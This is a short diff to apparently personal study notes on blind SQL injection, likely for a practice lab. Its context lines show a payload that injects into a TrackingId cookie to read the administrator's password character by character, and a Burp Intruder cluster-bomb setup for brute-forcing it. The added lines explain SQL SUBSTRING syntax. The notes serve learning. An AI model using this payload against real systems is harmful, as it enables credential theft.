@@ -916,6 +916,10 @@ TrackingId=xyz' AND (Select SUBSTRING(password,1,1) from users WHERE username='a
 
 You need to use burpsuite intruder --> cluster bomb --> TrackingId=xyz' AND (Select SUBSTRING(password,&1&,1) from users WHERE username='administrator')=='&a&'
 
+SUBSTRING(string, start_position, length)
+SELECT SUBSTRING('Hello World', 1, 5);  -- Returns 'Hello'
+__________________________________________________________________________________________________________________________________________________________________
+
 
 
 
